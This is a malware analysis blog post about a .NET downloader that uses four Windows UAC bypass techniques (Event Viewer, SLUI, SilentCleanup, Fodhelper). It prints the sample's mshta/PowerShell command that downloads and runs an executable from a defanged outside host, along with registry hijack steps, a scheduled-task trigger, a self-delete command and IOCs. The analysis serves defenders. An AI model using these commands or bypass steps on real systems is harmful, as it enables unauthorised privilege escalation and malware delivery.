---
layout: post
title: "UAC Bypass Techniques"
date: 2022-06-29 01:20:00 -0000
categories: UACbypass
---
![Entry Point]({{site.url}}/{{site.baseurl}}/images/lock.jpg)

## Introduction

In this post, I highlight old UAC bypasss techniques that are still in use. Although the bypass techniques implements in the analyzed sample are older and known, attempts are still being made to exploit them. As a result, defenders should be made aware of these on-going threats. 

I ran across this simple .NET downloader I'm naming *Adan Downloader* based on it's project path. The malware implements UAC bypass techniques in order to execute a Powershell download command proxied through mshta.exe.

The UAC bypass techniques implemented are:
* UAC Bypass via Event Viewer
* UAC Bypass via Slui
* UAC Bypass via SilentCleanup Scheduled Task
* UAC Bypass via Fodhelper

### Sample Metadata
<table>
    <thead>
        <tr>
            <th colspan=2>Adan Downloader</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>Filename</td>
            <td>Stub.exe</td>
        </tr>
        <tr>
            <td>File Type</td>
            <td>.NET Binary</td>
        </tr>
        <tr>
            <td>MD5</td>
            <td>47E16AF98E41C83EB2F07A2D29CA8AF9</td>
        </tr>
        <tr>
            <td>SHA1</td>
            <td>4F5161BA956ECB4A453893EB3FC34C1313C6C701</td>
        </tr>
        <tr>
            <td>SHA256</td>
            <td>72C9919F885DD2A6F4491E5BC227224D6A68E09AF553AD6CB21617FE2BC56534</td>
        </tr>
        <tr>
            <td>PDB</td>
            <td>C:\Users\Thede\source\repos\Adan\Loader v1\obj\x64\Release\Stub.pdb</td>
        </tr>
        <tr>
            <td>VT</td>
            <td> 
                <a href="https://www.virustotal.com/gui/file/72c9919f885dd2a6f4491e5bc227224d6a68e09af553ad6cb21617fe2bc56534">72C9919F885DD2A6F4491E5BC227224D6A68E09AF553AD6CB21617FE2BC56534</a>
            </td>
        </tr>
    </tbody>
</table>

### Analysis:

This downloader attempts to bypass User Account Control (UAC) to download unwanted files to a system. Upon execution, it conducts the following activity:
 
Creates a payload objects that contains the URLS and command line arguments for the downloaded file:
```
hxxp://source1.kapetownlink[.]com/installer.exe - Args: /qn CAMPAIGN="1640"
hxxps://setup.maskvpn[.]cc/g.asp?id=151 - Args: /silent /subid=603
```

![Entry Point]({{site.url}}/{{site.baseurl}}/images/main.png)
*Main Function*

For each payload URL, it constructs the following command to download additional files to `%ProgramData%\<random_string>.exe`.

<b>mshta command</b>
```powershell
@"mshta vbscript:(CreateObject(""Wscript.Shell"")).Run(
""cmd /c powershell -Command """"(New-Object System.Net.WebClient).
DownloadFile('hxxp://source1.kapetownlink[.]com/installer.exe', 
(Join-Path -Path $env:ProgramData -ChildPath '5OTP8CZoq3MomB2GxUYrHB8U.exe'))"""" 
& C:\ProgramData\5OTP8CZoq3MomB2GxUYrHB8U.exe /qn CAMPAIGN=""""1640"""""",0)
(window.close)"
```

The command proxies Powershell execution through the mshta utility. This utility normally executes Microsoft HTML Applications (HTA) files. The utility is known as a living off the land binary (LOLBIN) since it's native to the Windows OS. It's a signed tool that can be used to bypass a system's security measures.

After constructing the command, the downloader executes a function named *UACBypass.AutoBypass()*. The function starts by obtaining the Windows product name. Depending on the name, the downloader utilizes old techniques to bypass UAC security measures.

![UACAuto.Bypass]({{site.url}}/{{site.baseurl}}/images/uac_autobypass.png)

*AutoBypass Function*

### UAC Bypass Techniques

#### Windows 7: UAC Bypass via Event Viewer
    
If the product name starts with "Windows 7", the downloader abuses eventvwr.exe by hijacking the `HKCR\mscfile\shell\open\command` registry key to bypass UAC.

The downloader creates the registry key `HKCU\Software\Classes\mscfile\shell\open\command` and then sets the command value to the mshta command. Eventvwr is then started.

The technique works in part because of the relationship between the HKEY_CLASSES_ROOT (HKCR) and HKEY_CURRENT_USER (HKCU) registry keys. When `HKCU\Software\Classes\mscfile\shell\open\command` is created, a entry is also created in `HKCR\mscfile\shell\open\command`. The newly-created entry overwrites the mmc.exe entry that is normally there.
 
When eventvwr.exe is started, it reads `HKCR\mscfile\shell\open\command` to launce mmc.exe, however, since the HKCR key has been hijacked via the HKCU key, the mshta command is executed.

![UACAuto.Bypass]({{site.url}}/{{site.baseurl}}/images/eventvwr.png)


#### Windows 8: UAC Bypass via SLUI

If the product name starts with "Windows 8", UAC bypass is attempted by hijacking the `HKCR\Software\Classes\exefile\shell\open\command` registry key. 

The key `HKCU\Software\Classes\exefile\shell\open\command\` is created and the command is set to the mshta command. As explained previously, a entry is also created in the corresponding HKCR `\Software\Classes\exefile\shell\open\command` key. An additional value DelegateExecute is also created but the value is empty.

Slui.exe, an auto-elevated binary, is then executed with elevated privileges and executes the mshta command. 

![]({{site.url}}/{{site.baseurl}}/images/slui_func.png)


#### Other OS: UAC Bypass via SilentCleanup Scheduled Task

When the OS is determined to be other than Windows 7/8, the downloader reads the registry key `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin`.

This key contains a UAC Group Policy setting that indicates whether a user is prompted for consent to continue with an operation. 

The malware checks for a value of 2. The explanation for this value is [here](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/341747f5-6b5d-4d30-85fc-fa1cc04038d4).

If the key is set to 2, the downloader creates the key `HKCU\Environment\windir` and sets it value to the download command with "CleanReg &&" appended to the end. The malware then proceeds to start the *SilentCleanup* scheduled task.

*SilentCleanup* is native to Windows and is used to launch a silent auto disk cleanup when the system is running low on disk space.

The user's environment variables are stored in the `HKCU\Environment\` registry key. The malware adds the mshta command as the environment variable **windir**. As a result, when the *SilentCleanup* task is executed, the mshta command is executed.

![]({{site.url}}/{{site.baseurl}}/images/silentcleanup.png)


#### UAC Bypass via Fodhelper

The final UAC bypass technique implemented by the downloader involves *fodhelper*. *Fodhelper.exe* is used by Windows to manage optional features. During execution, it looks for the registry keys:
    `HKCU\Software\Classes\ms-settings` however, it doesn't normally exist by default.

The downloader creates the key `HKCU\Software\Classes\ms-settings\shell\open\command` and sets the value to the mshta command. As with the previous command, DelegateExecute is created but the value is empty.

*Fodhelper.exe* is then executed.

![]({{site.url}}/{{site.baseurl}}/images/fodhelper.png)

#### Cleanup Activity

The downloader cleans up after itself by deleting the UAC Bypass registry key it created. Then it deletes itself with the command:
    `cmd.exe /C choice /C Y /N /D Y /T 1 & Del <filename>`.

### IOCs

<b>Adan Downloader Hashes</b>
```
72c9919f885dd2a6f4491e5bc227224d6a68e09af553ad6cb21617fe2bc56534
de2477f5fe8ca28785e225b209f41ce0678c9f5ba0e6f0fcc4cbb520d53151b5
d5433a75ff122cf26115250a4131738972e4abd8e60ec336eab77c3a9ba29e21
```

<b>Project Path</b>

```
C:\Users\Thede\source\repos\Adan\Loader v1\obj\x64\Release\Stub.pdb
```

<b>UAC Bypass Registry Keys</b>
```
Fodhelper, HKCR|HKCU\Software\Classes\ms-settings\shell\open\command
SLUI, HKCU\Software\Classes\exefile\shell\open\command
Eventvwr, HKCU\Software\Classes\mscfile\shell\open\command
```

<b>SilentCleanup UAC Bypass Scheduled Task</b>
```
schtasks.exe /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I
```

<b>Download URLs</b>

```
d5433a75ff122cf26115250a4131738972e4abd8e60ec336eab77c3a9ba29e21
de2477f5fe8ca28785e225b209f41ce0678c9f5ba0e6f0fcc4cbb520d53151b5
    hxxps://source1.boys4dayz[.]com/installer.exe
    hxxps://setup.maskvpn.cc/g[.]asp?id=151
    hxxps://footerquotes.b-cdn[.]net/fq.exe

72c9919f885dd2a6f4491e5bc227224d6a68e09af553ad6cb21617fe2bc56534
    hxxp://source1.kapetownlink[.]com/installer.exe
    hxxps://setup.maskvpn.cc/g[.]asp?id=151
```

#### References:

* https://attack.mitre.org/techniques/T1218/005/
* https://attack.mitre.org/techniques/T1548/002/
* https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings
* https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/341747f5-6b5d-4d30-85fc-fa1cc04038d4
* https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
* https://www.rapid7.com/db/modules/exploit/windows/local/bypassuac_sluihijack/
* https://www.rapid7.com/db/modules/exploit/windows/local/bypassuac_silentcleanup/
* https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/